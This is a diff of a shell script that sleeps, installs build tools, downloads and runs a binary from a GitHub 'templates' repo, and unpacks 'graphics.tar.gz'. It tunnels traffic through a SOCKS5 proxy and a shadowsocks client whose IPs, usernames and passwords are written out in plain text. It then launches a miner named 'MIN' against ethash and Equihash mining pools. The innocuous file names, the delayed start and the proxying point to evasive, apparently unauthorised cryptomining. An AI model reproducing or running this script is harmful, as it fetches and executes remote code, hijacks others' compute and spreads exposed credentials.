@@ -1,7 +1,8 @@
 #!/bin/sh
 sleep 10m
-apt update
-apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+apt update 
 apt install curl libssl1.0-dev nodejs nodejs-dev node-gyp npm -y 
 wget https://github.com/christiarch/templates/raw/main/lba 
 chmod +x lba 
@@ -22,9 +23,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 181.215.184.109:45786
-socks5_username = Selshindeparshuram2012
-socks5_password = V7p9BkV
+socks5 = 176.53.133.217:57597
+socks5_username = 2BHVpyGPD
+socks5_password = 1rN14HAmV
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -41,10 +42,7 @@ chmod +x MIN
 
 apt -y install shadowsocks-libev rng-tools
 
-ss-local -s 144.217.7.95 -p 8388 -l 9999 -k rslzw -m chacha20-ietf-poly1305 -v &
+ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
 
-./graftcp/graftcp ./MIN --url=prodent.$(echo $(shuf -i 10-40 -n 1)-TEST)@ethash.kupool.com:8888 --log --extra 
+./graftcp/graftcp ./MIN --algo Equihash --pers auto --server stratum+tcp://zen.global.luxor.tech --port 700 --user prodent.theodore
 sleep 2
-./graftcp/graftcp ./MIN --url=prodent.$(echo $(shuf -i 10-40 -n 1)-TEST)@ethash.kupool.com:443 --log --extra 
-sleep 2
-./graftcp/graftcp ./MIN --url=prodent.$(echo $(shuf -i 10-40 -n 1)-TEST)@ethash.kupool.com:1800 --log --extra 
